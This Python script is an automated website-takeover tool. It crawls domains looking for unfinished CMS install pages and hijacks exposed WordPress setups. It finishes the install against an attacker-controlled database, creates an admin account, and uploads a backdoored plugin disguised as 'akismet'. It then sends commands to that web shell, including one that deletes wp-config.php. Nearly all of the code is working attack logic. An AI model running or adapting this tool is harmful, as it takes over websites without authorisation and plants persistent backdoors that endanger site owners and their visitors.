from multiprocessing import Process,Queue
import requests
import urllib3
from random import choice
import string
import shutil
import os
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#############################
########## Const ############
#############################

config_path = './config.json'

class CMS():
	def __init__(self):
		self._analized_domains = {}
		self.config = {}
		self._read_config_from_file()
		self._fire_process()

	def _read_config_from_file(self):
		with open(config_path, 'r') as f:
			self.config_content = f.read()
			for line in self.config_content.split('\n'):
				if len(line) == 0: continue
				if line[0] != '#':
					key = line.split('=')[0]
					value = line.split('=')[1]
					self.config[key] = value

	def _fire_process(self):
		self._queue = Queue()
		self._process_list = []

		for i in range(int(self.config['PROC_QUANTITY'])):
			proc = Process(target=self._crawl, args=())
			proc.daemon = True
			proc.start()
			self._process_list.append(proc)

	def _crawl(self):
		while True:
			self.domain = self._queue.get(True)
			if self.domain == 'KILL': return
			if self.domain not in self._analized_domains.keys(): 
				if self._is_cms_install_page(): self._attack_cms()
				else: self._analized_domains[self.domain] = {'Quantity': 1}

	def _is_cms_install_page(self):
		cms_type = None
		url = 'http://{}/'.format(self.domain)
		try:
			res = requests.get(url, timeout=5, verify=False)
		except requests.exceptions.Timeout:
			#print('[*] - Timeout..')
			return False
		except requests.exceptions.TooManyRedirects:
			#print('[*] - To many redirects..')
			#print(self.domain)
			return False
		except requests.exceptions.ConnectionError:
			#print('[*] - ConnectionError..')
			return False
		except requests.exceptions.RequestException as e:
			print('[*] - Exception, but I dont know :(')
			print(e)
			return False
		except Exception as e:
			print('[*] - {}'.format(self.domain))
			print('[*] - Exception, but I dont know :(')
			print(e)
		if res.status_code == 200:
			#print('[*] - Processing {}'.format(self.domain))
			if '<title>WordPress &rsaquo; Setup Configuration File</title>' in res.text: cms_type = 'wordpress'
			elif '<title>Joomla! Web Installer</title>' in res.text: cms_type = 'joomla'
			elif 'Choose language | Drupal' in res.text: cms_type = 'drupal_8'
			elif 'Select an installation profile' in res.text: cms_type = 'drupal_7'
			elif '<p>LocalSettings.php not found.</p>' in res.text: cms_type = 'mediawiki'
			elif '<title>Installing TYPO3 CMS</title>' in res.text: cms_type = 'typo3'
			elif '<h2>Welcome to the Serendipity Installation</h2>' in res.text: cms_type = 'serendipity'
			elif '<body ng-app="app" id="installation">' in res.text: cms_type = 'piwik'
			elif '<a href="/phpbb/install/app.php/install">Install</a>' in res.text: cms_type = 'phpbb'
			elif 'config.php is missing or corrupt.' in res.text: cms_type = 'textpattern'
		#www-auth header to authenticate (basic auth)
		elif res.status_code == 401: x=0
		#Unauthorized
		elif res.status_code == 403: x=0
		#page not found (keep trying...)
		elif res.status_code == 404: x=0
		#Server internal errors (keep trying...)
		elif res.status_code == 500: x=0
		elif res.status_code == 501: x=0
		elif res.status_code == 503: x=0
		else: x=0
		if cms_type is None: return False
		print('[*] - CMS Type is {}'.format(cms_type))
		print('[*] - {}'.format(self.domain))
		if cms_type is 'wordpress': return True
		else: return False
		#return True

	def _attack_cms(self):
		payload_post = {
			'dbname': self.config['MYSQL_DB_NAME'],
			'uname': self.config['MYSQL_USERNAME'],
			'pwd': self.config['MYSQL_DB_PW'],
			'dbhost': self.config['MYSQL_HOST'],
			'prefix': 'wp_',
			'language': 'en_US',
			'submit': 'Submit'
		}
		res = requests.post('http://'+self.domain+'/wp-admin/setup-config.php',params={'step': 2}, data=payload_post)
		if res.status_code != 200: return False
		print(res.status_code)

		payload_post = {
			'weblog_title': 'test',
			'user_name': self.config['WORDPRESS_ADM'],
			'admin_password': self.config['WORDPRESS_ADM_PW'],
			'pass1-text': self.config['WORDPRESS_ADM_PW'],
			'admin_password2': self.config['WORDPRESS_ADM_PW'],
			'admin_email': 'admin@gmail.com',
			'Submit': 'Install WordPress',
			'language': 'en_US'
		}
		res = requests.post('http://'+self.domain+'/wp-admin/install.php', params={'step': 2}, data=payload_post)
		if res.status_code == 500 and 'Error establishing a database connection' in res.text: 
			print('[*] - Error al conectarse a la DB')
			sys.exit(2)
		
		payload_post = {
			'log': self.config['WORDPRESS_ADM'],
			'pwd': self.config['WORDPRESS_ADM_PW'],
			'wp-submit': 'Log In',
			'redirect_to': 'http://{}/wp-admin/'.format(self.domain),
			'testcookie': 1
		}
		res = requests.post('http://'+self.domain+'/wp-login.php', data=payload_post)
		cookies = res.cookies

		r3 = requests.get('http://{}/wp-admin/plugin-install.php'.format(self.domain), cookies=cookies)
		look_for = 'name="_wpnonce" value="'
		try:
			nonceText = r3.text.split(look_for, 1)[1]
			nonce = nonceText[0:10]
		except:
			print("Didn't find a CSRF token, check the URL and/or credentials.")
			sys.exit(2)

		uploaddir = 'akismet'
		zipped_file = self._zip_plugin()

		files = {
			'pluginzip': (uploaddir + '.zip', open(zipped_file, 'rb')),
			'_wpnonce': (None, nonce),
			'_wp_http_referer': (None, self.domain + '/wp-admin/plugin-install.php?tab=upload'),
			'install-plugin-submit': (None,'Install Now')
		}

		r4 = requests.post('http://'+self.domain+'/wp-admin/update.php',
			files=files,
			params={'action': 'upload-plugin'}, 
			cookies=cookies)
		if r4.status_code == 200:
			print("Backdoor uploaded!")
			if "Plugin installed successfully" in r4.text:
				print("Plugin installed successfully")
			if "Destination folder already exists" in r4.text:
				print("Destination folder already exists")
		self._remove_wp_config_file()
		os.remove(zipped_file)
		return True

	def _send_cmd_shell(self,params):
		for x in range(1,10):
			r = requests.get('http://'+self.domain+'/wp-content/plugins/akismet-{}/class.akismet-plug.php'.format(str(x)), params=params)
			if r.status_code == 200: return r

	def _get_default_params_for_shell(self):
		return {
			'cmdexe': '',
			'path': self.config['DEFAULT_PATH'],
			'username': self.config['SHELL_USER'],
			'password': self.config['SHELL_PW']
		}

	def _remove_wp_config_file(self):
		params = self._get_default_params_for_shell()
		params['cmdexe'] = 'rm -f ./wp-config.php'
		self._send_cmd_shell(params)

	def _zip_plugin(self):
		file = '/tmp/akismet'
		try: os.remove(file)
		except: print('[*] - NoFile {}'.format(file))
		shutil.copyfile(self.new_shell_file, self.config['PLUGIN_FILE_INFECT'])
		print(shutil.make_archive(file, 'zip', self.config['PLUGIN_UPLOAD']))
		os.remove(self.new_shell_file)
		return file+'.zip'

	def process(self,domain):
		self._queue.put(domain)
